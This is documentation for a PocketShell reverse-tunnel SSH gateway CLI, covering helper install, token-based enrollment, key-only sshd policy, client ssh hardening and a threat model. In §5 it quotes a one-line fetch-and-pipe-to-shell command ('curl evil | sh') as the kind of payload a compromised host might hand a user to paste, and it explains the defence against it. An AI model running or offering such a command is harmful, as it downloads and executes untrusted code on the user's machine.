# Gateway: `pocketshell gateway`

`pocketshell gateway enroll|run|show` are the host-side entry points for the
PocketShell **gateway transport**: the reverse-tunnel host agent for machines
that have no inbound SSH (a phone cannot dial into a laptop behind NAT). The
host holds one outbound WSS connection to the SSH gateway; the gateway opens
multiplexed streams over it, each bridged to the host's own sshd listening on
loopback. No inbound ports are opened anywhere. The client side —
`pocketshell gateway devices|pin|ssh` on your laptop, reaching such a host
with plain OpenSSH — is §9.

The host-side Python commands are deliberately thin: they resolve the installed Go
helper **`pocketshell-link`** and replace their own process with it
(`os.execv`). No tunnel, enrollment, or SSH logic lives in Python. That is a
feature, not a shortcut:

- **stdin** is inherited untouched — the enroll token you pipe in flows
  straight to the helper. `pocketshell` never reads it, so it can never log
  it, and there is deliberately no `--token` CLI flag (a token in argv leaks
  via shell history and process listings).
- **signals** behave as if you had run `pocketshell-link` yourself — Ctrl+C /
  SIGTERM reach the helper's own handlers directly.
- **exit codes** are the helper's, verbatim (enroll/show failure → 1, bad
  usage → 2, clean stop → 0).
- **flags** are forwarded as exact argv elements. Values with spaces (host-key
  lines, paths) stay single elements; nothing is ever interpolated through a
  shell.

Options you omit are not forwarded at all, so the helper's own defaults
apply — this CLI does not carry a second copy of them:

| Option | Forwarded only when passed | Helper default |
| --- | --- | --- |
| `--server` | yes | `wss://gateway.pocketshell.io` |
| `--config-dir` | yes | `${XDG_CONFIG_HOME:-$HOME/.config}/pocketshell-link` |
| `--ssh-host` | yes (`enroll`) | `127.0.0.1:22`, loopback only |
| `--device-id` | yes (`enroll`) | auto-generated from the hostname |
| `--expect-host-key` | yes (`enroll`) | none (the probed key is pinned unverified) |
| `--re-enroll` | yes (`enroll`) | off — re-enrollment is refused without it |
| `--dev-broker-issuer` | yes (`enroll`, dev-guarded) | production broker issuer |
| `--insecure-dev` | yes, never defaulted | off |

## 1. Install the helper

`pocketshell` does **not** bundle or download `pocketshell-link` (and accepts
no credentials for fetching it). Two supported routes, both ending in a
binary the wrapper protocol-verifies before every use (§1.1):

**Private beta — install the platform wheel (recommended).** The private
repo's CI packages the helper as `pocketshell-gateway-link` wheels for
linux amd64/arm64 and darwin amd64/arm64. Retrieve the wheel for your
platform from the **authenticated private CI** (you need repo access),
**verify it against the independently published sha256 digest and build
provenance** — no matching digest, no install — then install offline:

```bash
sha256sum pocketshell_gateway_link-*.whl   # compare with the published digest
pip install --no-index --no-deps /verified/path/pocketshell_gateway_link-<version>-<platform>.whl
```

`--no-index --no-deps` keeps the install fully offline; the wheel is
dependency-free. There is no public package yet, so there is deliberately
no `pocketshell` extra to depend on one.

**Build from source.** From a checkout of the private
[pocketshell-gateway](https://github.com/PocketShell-io/pocketshell-gateway)
repository (you need access and a Go toolchain):

```bash
cd /path/to/pocketshell-gateway
go build -o "$HOME/.local/bin/pocketshell-link" ./cmd/pocketshell-link
```

An un-injected source build honestly reports itself as `devel`/`unknown`
build metadata — protocol-compatible and fine for local testing, but never
mistaken for a release (release artifacts carry injected version/commit
values).

### 1.1 Resolution order and failure modes

1. `POCKETSHELL_GATEWAY_HELPER` — an explicit pin to a trusted binary. A pin
   that is missing or not executable is a hard error; the wrapper never
   silently falls back to a different binary off PATH.
2. the binary inside an installed `pocketshell-gateway-link` wheel. An
   installed-but-broken wheel — binary missing or not executable, wheel
   built for another platform (Windows has no wheel at all) — is a hard
   error, never a silent fallback.
3. `pocketshell-link` on `PATH`.

With none of the three, every `gateway` subcommand exits **127** and prints
both routes (wheel install, or the build instructions above). A found
helper must additionally answer the `version --json` metadata probe with
the exact protocol tag `pocketshell-tunnel-v1` before anything runs — a
stale, alien, or misbehaving helper is refused with exit **126** and a
one-line compatibility error (no helper output is echoed, nothing is
downloaded). See
[docs/gateway-distribution.md](gateway-distribution.md) for the full
distribution contract, the checksum verification steps, and the gate's
bounds. (The helper's other subcommands, e.g. `pocketshell-link version`,
are reachable by calling the helper directly; this CLI wraps exactly
`enroll`, `run`, and `show`.)

## 2. Prerequisites on the host

The tunnel carries **real SSH, end to end**. It is not a shell-execution
protocol: the SSH session terminates at your host's own sshd, with standard
SSH cryptography between the client and sshd. That makes the prerequisites
the ordinary ones for SSH-ing into this machine:

- **A running local sshd** reachable on loopback (default `127.0.0.1:22`).
  The helper only ever bridges to a loopback address — a non-loopback
  `--ssh-host` is rejected.
- **Key-based access configured.** Put the client device's SSH public key in
  your `~/.ssh/authorized_keys` for the user who will connect. This pairing
  is entirely between you and your host: the gateway never issues, stores, or
  brokers your SSH user keys. Installing a key *enables* key login; by
  itself it does not disable password, keyboard-interactive, empty-password
  or root login — see §2.1 for the required key-only policy.
- **Your sshd host key fingerprint**, if you want to pin it explicitly at
  enroll time (recommended):

  ```bash
  ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
  # 256 SHA256:AbCd…/Fp= (ED25519)
  ```

There are four distinct credential relationships, and keeping them separate
is the point of the design:

- **Host key (sshd → client):** your sshd's real public host key. `enroll`
  probes it over loopback and pins it in the local state; the tunnel-side
  client expects exactly that key. Pass `--expect-host-key` with the
  authorized_keys line or the `SHA256:…` fingerprint to abort enrollment if
  the probed key is not the one you expected (e.g. an unexpected listener on
  port 22).
- **User key (client → sshd):** regular `authorized_keys` authentication for
  your user account. Unchanged by the gateway; you provision it yourself.
- **Device key (host agent → gateway):** an Ed25519 keypair generated locally
  at enroll time, used to prove device identity to the gateway via a signed
  challenge. It authorizes a *tunnel to sshd*, never a *shell*: **with the
  endpoint's key-only policy (§2.1) actually in effect**, a paired device
  still needs a valid SSH user key to get past sshd — if the daemon also
  accepts another authentication method, that method's own credentials work
  over the tunnel too.
- **Enrollment token (operator → gateway):** a short-lived (≤ 5 minutes)
  RS256 JWT scoped to `pocketshell-gateway`, minted by the trusted PocketShell
  token service (`https://a7sota2qic.execute-api.eu-west-1.amazonaws.com`,
  `POST /gateway/token`) in exchange for your web-client sign-in. The
  gateway verifies this broker token only — your raw account sign-in
  credential never reaches the gateway. The token authorizes identity
  management and routing during enrollment, nothing more, and expires within
  five minutes (or with your upstream sign-in, whichever is sooner).

### 2.1 Endpoint SSH policy — key-only required, operator-reviewed

Installing a key (above) enables key login; it does not disable anything
else. This matters because of what the transport is: **opaque SSH bytes
routed to your local listener.** The gateway never parses them, so it
cannot enforce how — or as whom — your sshd authenticates anyone. A
compromised gateway can open SSH conversations with that listener under
**arbitrary usernames**: the route does not bind an SSH username to your
enrolled device, so key-only must hold for **every** username the listener
admits, not merely a `Match User` block for the intended PocketShell
account. Two enrollment properties are often over-read here: the pinned
host key identifies the *server*, not which authentication methods the
daemon allows, and the enroll-time host-key probe deliberately stops
before user authentication — a successful `gateway enroll` is not an
audit of your sshd policy.

Suggested profile — the key-only lines are the **required** part;
`AllowUsers` and `PermitRootLogin no` are the **recommended** account
restrictions on top of it (replace the placeholder account; review the
existing configuration rather than appending blindly — `Include`d files
such as `/etc/ssh/sshd_config.d/*` and every `Match` block can override
global directives):

```text
AllowUsers YOUR_NONROOT_ACCOUNT
AuthenticationMethods publickey
PubkeyAuthentication yes
PasswordAuthentication no
KbdInteractiveAuthentication no
PermitEmptyPasswords no
PermitRootLogin no
```

- [`AuthenticationMethods publickey`](https://man.openbsd.org/sshd_config#AuthenticationMethods)
  is the line that makes the endpoint key-only; the default is `any`.
  Password and keyboard-interactive login are
  [separate switches](https://man.openbsd.org/sshd_config#PasswordAuthentication)
  ([keyboard-interactive](https://man.openbsd.org/sshd_config#KbdInteractiveAuthentication)),
  and OpenSSH documents a `none` method that authenticates password-less
  accounts when
  [`PermitEmptyPasswords`](https://man.openbsd.org/sshd_config#PermitEmptyPasswords)
  allows it — hence both switches and both refusals.
- [`AllowUsers`](https://man.openbsd.org/sshd_config#AllowUsers) and
  [`PermitRootLogin no`](https://man.openbsd.org/sshd_config#PermitRootLogin)
  (`prohibit-password` still permits some root authentication) are the
  recommended account/root restrictions — recommended hardening **on top
  of** the required key-only policy, and worth stating explicitly because
  the opaque route admits any username. They are a selected baseline
  choice, not a protocol or client-enforced universal requirement: this
  CLI, the helper and the gateway enforce neither these directives nor
  root denial of any kind, and a deliberately admitted root account would
  still have to present a key — refusing root and excluded accounts (the
  checks below) is acceptance evidence for *this chosen profile*, nothing
  more universal. They exist only in your sshd configuration and apply to
  every way the daemon is reached, ordinary direct SSH included — review
  the change as you would any sshd change.

Verify the **effective** policy, not the file you edited — `Match` and
`Include` can change it per username, per source address and per local
destination, and checks that skip the daemon's real configuration input
can honestly validate a *different* configuration than the one it runs.
First read the running daemon's actual arguments (`systemctl cat sshd`
or `systemctl show -p ExecStart sshd` under systemd, `ps -o args= -p PID`
with your init system's equivalent otherwise) and carry its configuration
file and **every** `-o` override into both commands — command-line
options override file values, so a bare `sshd -t`/`sshd -T` reports the
file alone, not the file plus the overrides your daemon actually applies.
(If the arguments name neither `-f` nor any `-o`, the daemon is reading
the default `/etc/ssh/sshd_config`; pass `-f` anyway to pin that
assumption.) Both commands read the host's private keys, so run them as
root on a standard install:

```bash
# -f and each -o below must repeat the running daemon's arguments exactly
sshd -t  -f DAEMON_CONFIG_FILE -o DAEMON_OVERRIDE …                # validity first
sshd -T -f DAEMON_CONFIG_FILE -o DAEMON_OVERRIDE … \
        -C user=YOUR_NONROOT_ACCOUNT,host=localhost,addr=127.0.0.1,laddr=127.0.0.1,lport=22
```

([test mode](https://man.openbsd.org/sshd#T),
[connection parameters](https://man.openbsd.org/sshd#C)) The `-C` fields
describe two different ends of the connection and neither stands in for
the other: `laddr`/`lport` are the **destination the agent dials** — the
address and port your listener is bound to, i.e. the configured
`--ssh-host` endpoint (`127.0.0.1:22` by default) — while `addr`/`host`
are the **accepted client source** address and the host name that source
resolves to, as sshd sees them on the accepted socket. A loopback dial
usually presents a same-family loopback source, but that is an observed
property, not an identity: confirm what your daemon actually accepted
(its `Accepted … from` log lines, or `ss -tnp` while a tunnel stream is
up) instead of equating it with the dialed destination. Run the `-T -C`
variant for every username you intend to admit **and** for `root` and
unintended accounts, and for **each loopback family the listener
actually serves** — repeat with `addr=::1,laddr=::1` and the host name
that source resolves to when IPv6 is reachable too, since the helper
equally accepts literal `::1` or `localhost` as its endpoint. Supply the
full context because `Match` blocks are evaluated against exactly these
values: `LocalAddress`/`LocalPort`/`Host`/`Address` criteria are
exercised only when the fields they test are supplied, and a `-T`
printout without `-C` shows none of what your `Match` blocks do.

Applying the change is an ordinary, OS-specific operator procedure, and
nothing here executes it for you: edit the file the daemon actually
reads (the `-f` path above, `Include`d snippets and `Match` blocks
included), pass `sshd -t` with the daemon's same `-f`/`-o` arguments,
**keep your current SSH session open**, reload through your OS service
manager (`systemctl reload sshd` under systemd, `service ssh reload` on
sysv-style Debian/Ubuntu — unit and service names differ per OS), then
re-run both checks with the same arguments to confirm the effective
policy you just put live.

Honest limits of this policy: with the endpoint's verified key-only
policy, the independently pinned host key, trusted client/host software
and protected authorized private keys, gateway credentials alone do not
authenticate an SSH session — the gateway can still initiate connections
and deny service. Validation and reload commands never remove private
keys that were already exposed; treat key rotation or removal as its own
trusted procedure, and note it prevents *new* logins only — it does not
terminate an established session. That is separate from gateway-side
routing/device revocation — which tears the tunnel's streams down at an
honest gateway only: a malicious or compromised gateway can ignore its
own revocation registry and callbacks, so stopping an abuser immediately
takes trusted endpoint action on your host. Endpoint-local SSH key
revocation and session termination are exactly that trusted endpoint
action — the only one of the two revocations still under your control
when the gateway itself is the adversary.

## 3. Enroll the host

One-time per host. Enrollment needs a fresh **gateway enrollment token** —
a short-lived (≤ 5 minutes) token scoped to `pocketshell-gateway`, minted by
the trusted PocketShell token service. Two ways to supply it:

**Logged in on the host (`pocketshell login`)** — just run

```bash
pocketshell gateway enroll
```

The wrapper first resolves and protocol-verifies the helper (§1.1), then
mints the token from your login session and hands it to the helper as its
entire stdin through a private pipe (`os.pipe` → write → close → `dup2`
onto fd 0 → `execv`). The token is never in argv, the environment or a
file, and your terminal's stdin is not inherited. Not logged in → exit
**3** with a hint to run `pocketshell login` or use `--token-stdin`.
Auto-minting only ever sends the token to the production gateway, or to a
non-production `--server` you name exactly with `--trust-gateway HOST`
(same strict URL rules as the client, §9.1); `--dev-broker-issuer` always
needs a lab token on `--token-stdin`.

**Token piped in** — generate it in the PocketShell web client's gateway
settings (**Generate enrollment token**), then:

```bash
pocketshell gateway enroll --token-stdin < enrollment-token.txt
```

**Already enrolled?** Re-enrollment is explicit: the helper refuses to
overwrite an existing registration unless you pass `--re-enroll` (the
gateway may also have re-enrollment disabled entirely — that refusal comes
from the server, not the CLI).

Useful flags:

```bash
pocketshell gateway enroll --token-stdin \
    --device-id office-workstation \
    --ssh-host 127.0.0.1:22 \
    --expect-host-key "SHA256:AbCd…/Fp=" \
    --re-enroll
```

- With `--token-stdin` the token is read from your stdin. The token
  is short-lived — run enroll right after generating it. It travels only as
  the `Authorization` header of the enroll request, never in a URL, argv, or
  log line, and this wrapper passes stdin through opaquely (it never reads,
  exchanges, or logs the token; there is no token CLI flag — argv leaks via
  shell history and process listings).
- **Never pipe your raw account sign-in credential here.** Only the
  gateway-scoped enrollment token belongs on stdin; the account token itself
  must never reach the gateway.
- `--expect-host-key` pins the sshd host key you expect; a mismatch aborts
  enrollment. Without it, the helper still probes and pins whatever the
  local sshd presents — pass the flag when you can verify the fingerprint.
- Enrollment proves possession of the generated device key via a signed
  challenge; the gateway verifies the enrollment token's broker issuer,
  fixed `pocketshell-gateway` audience, and short expiry.

## 4. Run the agent

```bash
pocketshell gateway run
```

Foreground process; stop with Ctrl+C or SIGTERM (clean exit 0). It reads the
state written by `enroll` from the config dir. `--server` overrides the
enrolled URL; `--verbose` turns on debug logging (to stderr).

Run it under any supervisor. A reproducible **systemd user unit** (no root,
runs as the same user who enrolled — so it sees the same config dir, the
pinned host key, and the device key; the helper is pinned by absolute path
so the unit cannot be satisfied by an arbitrary binary that happens to be on
PATH; no `--ssh-host` override: the unit serves exactly the enrolled
loopback sshd):

```ini
# ~/.config/systemd/user/pocketshell-gateway.service
[Unit]
Description=PocketShell gateway host agent (reverse tunnel)
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=%h/.local/bin/pocketshell gateway run --verbose
Environment=POCKETSHELL_GATEWAY_HELPER=%h/.local/bin/pocketshell-link
# XDG_CONFIG_HOME must match the enroll-time value; the default below is
# what `gateway enroll` used when the variable was unset for that user.
Environment=XDG_CONFIG_HOME=%h/.config
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
```

```bash
systemctl --user daemon-reload
systemctl --user enable --now pocketshell-gateway.service
journalctl --user -u pocketshell-gateway.service -f
```

Adjust the two absolute paths (`ExecStart`, `POCKETSHELL_GATEWAY_HELPER`) to
where `pocketshell` and the built `pocketshell-link` actually live for this
user — `pocketshell gateway show` must run as this same user and print the
enrolled state before you enable the unit; if it prints nothing, the unit
would enroll nothing either.

## 5. Show the enrolled state

```bash
pocketshell gateway show
# server:            wss://gateway.pocketshell.io
# device id:         …
# local ssh:         127.0.0.1:22 (loopback only)
# device key:        SHA256:…
# pinned ssh host key: …
```

`show` prints no secrets (the device private key stays in its `0600` file in
the config dir).

To let a client pin this host (§9.3), print just the host-key line:

```bash
pocketshell gateway show --host-key
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA…          ← stdout: the only thing to copy
# device home-lab, host key SHA256:… (ED25519).  ← stderr: context
# On the client run `pocketshell gateway pin home-lab` and paste the key line above at its prompt.
```

stdout is exactly one `<keytype> <base64>` line, re-validated with the
client's strict pin parser — deliberately **not** a ready-to-run shell
command (a compromised host could otherwise hand you `…; curl evil | sh` to
paste). Compare the fingerprint on both ends.

## 6. Docker / local development gateways

Against a gateway running locally or in Docker (plain `ws://`, no TLS), the
complete flow has **four** explicit pieces — server, dev mode, dev issuer,
token — and the helper checks the token's shape **locally, before any
network request**:

```bash
pocketshell gateway enroll --token-stdin \
    --server ws://gateway:8080 \
    --insecure-dev \
    --dev-broker-issuer "https://lab-broker.example" \
    < lab-token.txt

pocketshell gateway run --server ws://gateway:8080 --insecure-dev
```

- **`--server`** names your lab gateway explicitly. Plain `ws://`/`http://`
  URLs are accepted only together with `--insecure-dev`, on **every**
  command that dials — it is never sticky and never defaulted. TLS
  verification is never skipped either way, and there is no cert-skip flag.
  The URL is forwarded verbatim: IPv6 literals (`ws://[::1]:8080`), paths
  and ports are supported shapes the helper itself validates.
- **`--dev-broker-issuer`** names the issuer your **local lab broker** mints
  its ephemeral enrollment tokens with. The helper's local guard refuses
  every JWT whose `iss` is not exactly this value — including every
  ephemeral lab token when the flag is omitted, and any Google ID token
  always. The refusal happens **before any HTTP request**; that is designed
  behavior, not a bug. The wrapper additionally refuses the flag without
  `--insecure-dev`, without an explicit non-blank `--server` (a blank one
  would let the helper fall back to its built-in production default), for a
  `--server` URL it cannot parse at all (e.g. a malformed IPv6 literal), and
  whenever `--server` names the production gateway — either
  `gateway.pocketshell.io` or its legacy `relay.pocketshell.io` alias,
  compared case-insensitively and ignoring the trailing FQDN dot, so
  `GATEWAY.POCKETSHELL.IO:8080` or `relay.pocketshell.io.` cannot slip
  through. Lab targets (loopback IPv4/IPv6, docker hostnames, paths) are
  forwarded verbatim.
- **The lab token itself** must be a JWT with the broker shape: `aud` exactly
  `pocketshell-gateway`, `scope` exactly `pocketshell.gateway`, lifetime ≤ 5
  minutes, unexpired, RS256-signed. These are shape checks on unverified
  claims (a disclosure gate); the gateway still verifies the signature. Your
  lab's token mint must produce exactly this shape and its gateway side must
  verify the same issuer — the new-API gateway has no accept-any-token mode
  (that flag exists only on the legacy relay binary); point the lab's
  routing-auth verifier at the lab broker's keys, as the Go repo's lab
  fixtures do.
- **Loopback OpenSSH and independent pins hold in the lab too**: the agent
  bridges only to the configured loopback sshd endpoint (default
  `127.0.0.1:22`), and `--insecure-dev` never lifts that. Enrollment probes
  and pins the lab host's real sshd host key independently of the enrollment
  token; the device key, the pinned host key, and the enrollment token
  remain the three separate credentials described in §2. Nothing in this
  section names real secrets — every issuer and URL above is a placeholder.

The production web-client flow from §3 does not apply to a lab: production
tokens carry the production broker issuer and are refused against a lab
`--dev-broker-issuer`, and vice versa.

## 7. Relationship to the legacy `link` transport

This is a different protocol from the older experimental transport, and the
two are **not interoperable**:

| | `pocketshell gateway …` (this doc) | `pocketshell link run` / `pocketshell relay serve` |
| --- | --- | --- |
| Transport | Go `pocketshell-link` helper → SSH gateway | Python daemon → generic relay (`docs/link-transport.md`) |
| Auth | Per-device Ed25519 key enrolled via signed challenge with a gateway-scoped, ≤ 5 min enrollment token | One shared relay token (`--token`) |
| Payload | Real SSH streams to the local sshd | Relay-side exec/PTY protocol |
| State | `${XDG_CONFIG_HOME:-$HOME/.config}/pocketshell-link` | none (flags only) |

Do not point a legacy `pocketshell link run` at the gateway URL: the gateway
speaks the tunnel protocol only and will not serve the legacy shared-token
handshake. Both command groups remain installed side by side, but a host is
enrolled with either one gateway or one legacy relay — never both mixed.

## 8. Status

The host-side commands wrap the Go agent; the CLI client (§9) reaches
enrolled hosts with OpenSSH. How the PocketShell phone/desktop app pairs
and connects through this tunnel is separate, in-progress work elsewhere.
The production gateway currently runs without its host registry, so
`/api/v1/hosts/*` (and therefore `gateway ssh`) is not served there yet. The same goes for the enrollment-token flow: the web
client's **Generate enrollment token** action and its broker exchange are
being built (web client and token-service integration in progress, not
deployed/production yet) — until they land, obtain tokens from lab tooling
as in §6. This wrapper treats the token on stdin as opaque bytes either way;
it will not change when the issuer UI ships.

## 9. Client side: reach an enrolled host

On the laptop you connect **from** (needs the `[link]` extra for
`websockets`: `pip install 'pocketshell[link]'`):

```bash
pocketshell login                        # once: device sign-in, stores a CLI session
pocketshell gateway devices              # list your enrolled hosts
pocketshell gateway pin home-lab         # paste the line from `gateway show --host-key` ON THE HOST
pocketshell gateway ssh home-lab -l me   # OpenSSH through the gateway
```

Every command that talks to the gateway mints a fresh short-lived (≤ 5
min) broker JWT from the `pocketshell login` session and sends it only in
the `Authorization` header (`devices`) or the first WebSocket text frame
(`proxy`) — never in a URL, argv, environment variable, file or log line.
Not logged in → exit **3**.

Both token-bearing connections ignore environment proxies (`HTTPS_PROXY`,
`HTTP_PROXY`, `ALL_PROXY`, either case, and `NO_PROXY`) and CA overrides
(`SSL_CERT_FILE`, `SSL_CERT_DIR`): they go direct and verify TLS against the
platform's compiled-in default CA file/directory only. Otherwise the process
environment is trusted — an `.envrc` that can set `PYTHONPATH` or
`LD_PRELOAD` runs code inside the CLI, which no CLI can defend against.

### 9.1 Choosing the gateway

The default is the production gateway `wss://gateway.pocketshell.io`
(its `relay.pocketshell.io` alias is equally production). Any other
`--server`:

- must be a bare origin (`wss://host[:port]`, no path, query, fragment or
  credentials), with a strict host — an IP literal or an IDNA-encoded DNS
  name; whitespace, quotes, `%`, `?`, `#`, backslashes and shell
  metacharacters are refused;
- requires **`--trust-gateway HOST`** naming exactly that host. The client
  sends it a real broker token, which a hostile server could replay
  against the production identity API for up to five minutes;
- plain `ws://`/`http://` additionally requires `--insecure-dev` **and** a
  loopback IP literal or `localhost` (a single-label docker service name
  such as `gateway` is accepted with a cleartext warning). TLS
  certificate verification is never optional, and neither environment
  proxies nor `SSL_CERT_FILE`/`SSL_CERT_DIR` are used (see above).

### 9.2 `gateway devices [--json]`

`GET /identity/v1/devices` with the bearer token (redirects are never
followed — urllib would forward the header). Shows each device id,
active/revoked, the host key fingerprint **as advertised by the gateway
(untrusted)**, and your local pin state (`pinned`, `pinned (DIFFERS from
advertised)`, `not pinned`). All gateway-provided text is sanitized. The
JSON output carries fingerprints only, never the advertised key line, so
`devices --json | … | gateway pin` cannot turn the gateway's claim into
trust.

### 9.3 `gateway pin DEVICE_ID` / `gateway unpin DEVICE_ID`

Pinning is the **only** way a host key becomes trusted. Run
`pocketshell gateway show --host-key` on the host (§5), bring that one
line over a channel you trust, and paste it at the `gateway pin` prompt
(or pipe it on stdin; a positional argument is also accepted and
validated identically). The line must be exactly `<keytype> <base64>`
(`ssh-ed25519`, `ecdsa-sha2-nistp256/384/521`, or `ssh-rsa` ≥ 2048 bits):
printable ASCII, one space, canonical base64 decoding to a well-formed key
blob of the stated type with nothing trailing. Comments, options, host
patterns, `@cert-authority`/`@revoked` markers and extra lines are refused.
`pin` prints the `SHA256:` fingerprint — compare it with the host's.

Pins live in `${XDG_CONFIG_HOME:-~/.config}/pocketshell/gateway_known_hosts`
(directory `0700`, file `0600`, written atomically) as
`pocketshell-gateway.<device-id> <keytype> <base64>` lines. The whole file
is re-validated on every read: a single foreign line (marker, wildcard,
hashed host, comment, second key for one device), group/world-writable
permissions, a foreign owner or a symlink makes it untrusted, and
`gateway ssh` refuses to run. A different key for an already pinned device
needs `--replace` (re-keyed host — verify on the host first).

### 9.4 `gateway ssh DEVICE_ID [-l USER] [-i KEY] [-- SSH_ARGS…]`

Execs the OpenSSH client (`ssh` resolved once to an absolute path) with an
explicit configuration; refuses to run without a valid pin:

- `-F none` — your `~/.ssh/config` is not read (`Host *` `ForwardAgent`,
  `ProxyJump`, `LocalCommand`, `ControlMaster`… cannot apply);
- host trust: `StrictHostKeyChecking=yes`, `UserKnownHostsFile=<pin file>`,
  `GlobalKnownHostsFile=/dev/null`, `HostKeyAlias=pocketshell-gateway.<id>`,
  `UpdateHostKeys=no`, `CheckHostIP=no`, `VerifyHostKeyDNS=no`,
  `CanonicalizeHostname=no`;
- nothing of yours is exposed to the host: `ForwardAgent=no`,
  `ForwardX11=no`, `ForwardX11Trusted=no`, `ClearAllForwardings=yes` (only
  dropped when you pass `-L`/`-D`), `Tunnel=no`, `PermitLocalCommand=no`,
  `EnableEscapeCommandline=no` (with `IgnoreUnknown` for OpenSSH < 9.2);
- no session sharing: `ControlMaster=no`, `ControlPath=none`,
  `ControlPersist=no`, `ProxyUseFdpass=no`;
- key authentication only: `PubkeyAuthentication=yes`,
  `PreferredAuthentications=publickey`, `PasswordAuthentication=no`,
  `KbdInteractiveAuthentication=no`, `GSSAPIAuthentication=no`,
  `HostbasedAuthentication=no`, `IdentitiesOnly=yes` (always: `-i KEY`, or
  your default `~/.ssh/id_*` files; agent-only keys without a file are not
  offered); `Compression=no`, `ExitOnForwardFailure=yes`;
- `ProxyCommand=<absolute python> -P -m pocketshell gateway proxy <id> […]`:
  the device id is validated against `^[A-Za-z0-9][A-Za-z0-9._:-]{2,63}$`,
  each element is `shlex.quote`d and `%` is doubled for ssh's token
  expansion (no `%h`/`%n` tokens are used), ssh runs it with
  `SHELL=/bin/sh`, and `-P` keeps a `pocketshell/` or `click.py` in your
  current directory from being imported instead of the real package.

The hardening `-o` options come first (for ssh, the first value wins), then
your allowlisted arguments, then `--`, the destination alias, and the
remote command. **Extra ssh arguments** (after `--`) are limited to
`-L SPEC`, `-D SPEC`, `-N`, `-T`, `-t`, `-v`/`-vv`/`-vvv`, `-q`, followed by
an optional remote command (passed verbatim; it runs in the remote shell,
as with plain ssh). Everything else is refused — `-o` in any form, `-F`,
`-J`, `-W`, `-A`, `-X`/`-Y`, `-M`/`-S`, `-w`, `-f`, `-p`, `-E`, and `-R`
(remote forwarding would expose a port of your machine to the host).
`-l` names are restricted to `[A-Za-z0-9_][A-Za-z0-9._@-]*`; the pin file
and `-i` paths must be absolute and free of whitespace, `%`, `$`, `~`,
quotes, backslashes and non-ASCII (ssh would expand or split them — set
`XDG_CONFIG_HOME` to a plain path if your home directory has such
characters).

```bash
pocketshell gateway ssh home-lab -l me -i ~/.ssh/id_ed25519
pocketshell gateway ssh home-lab -l me -- -N -L 8080:localhost:80
pocketshell gateway ssh home-lab -l me -- uptime
```

### 9.5 `gateway proxy DEVICE_ID` (the ProxyCommand)

Normally started by `gateway ssh`. Dials
`wss://<gw>/api/v1/hosts/<id>/ssh` (no query, no Origin header, no
compression, no environment proxy), sends
`{"type":"auth","v":1,"token":…,"device_id":…}` as the first text frame,
and requires a strict `ready` frame (exact keys and types, `v` = 1, no
duplicate keys or NaN, ≤ 16 KiB) whose `device_id` equals the requested
one — all within one 30 s deadline covering TCP, TLS, the upgrade and
`ready`. `ready.ssh_host_key` is ignored. Then it pumps raw SSH bytes as
binary messages (≤ 32 KiB per write; inbound messages > 64 KiB, binary
data before `ready`, or any text after `ready` abort the session). stdout
carries SSH payload only; stdin EOF closes the WebSocket; a WebSocket
close ends the process. Gateway error messages are printed to stderr only
after stripping ANSI/VT sequences and every Unicode control/format
character (bidi overrides, zero-width), on one line, capped at 200
characters; unexpected errors print a one-line class name, never a
traceback.

| Exit | Meaning |
| --- | --- |
| 0 | clean end (stdin EOF, normal close) |
| 1 | unexpected local error |
| 2 | usage (bad device id / server) |
| 3 | not logged in / no gateway token |
| 4 | connect, TLS or HTTP-upgrade failure; unclassified refusal |
| 5 | handshake timeout (local deadline or close 4408) |
| 6 | gateway protocol violation (local detection or close 4400) |
| 7 | unauthorized (close 4401/4403) |
| 8 | unknown, revoked or not your device (close 4404) |
| 9 | host offline (close 4503) |
| 10 | quota (close 4429) |
| 11 | connection lost after `ready` |

### 9.6 Client-side threat model

The security goal: a compromised gateway, broker or enrolled host must not
get into the client's machine.

**A compromised gateway** sees only ciphertext (SSH is end to end with
the host's sshd) and cannot impersonate the host: the host key is checked
by OpenSSH against your independent pin, never against anything the
gateway sends (`ready.ssh_host_key` and `devices` are advisory). It
**can**: deny or drop service; see connection metadata (which device, when,
traffic volume); replay the broker token you sent it against the gateway
identity API for up to five minutes (enroll/revoke devices — the token is
gateway-scoped and does not reach your account itself); send hostile
frames — which are size-bounded, strictly parsed, and sanitized before any
byte reaches your terminal; nothing it sends reaches stdout except SSH
payload consumed by ssh itself. It cannot make ssh forward your agent,
X11, or local ports (all off, and your ssh_config is ignored), and it
cannot inject options into the ssh or ProxyCommand line.

**A compromised broker** can mint tokens and, with them, use the gateway
identity API as you — including listing and revoking devices. It still
cannot pass host-key verification for a pinned device, so it cannot
intercept or impersonate your SSH sessions or reach your machine.

**A compromised enrolled host** controls everything inside the SSH
session it serves: output it shows you (escape sequences included —
the same exposure as any SSH session), and any port you explicitly
forward with `-L`/`-D` reaches a service *it* chose. It gets no agent, no
X11, no remote forwarding (`-R` is refused), no escape command line, and
no shared control socket. When pinning, the key line it prints is data
(one validated `<keytype> <base64>` line), never a command, so a hostile
host cannot trick you into running something by pasting.

**Not covered:** a compromised client machine (it holds the login
session, the pins and your SSH keys); you pinning a key without checking
where it came from; hosts whose sshd still allows non-key authentication
(see §2.1); denial of service by any party on the path.
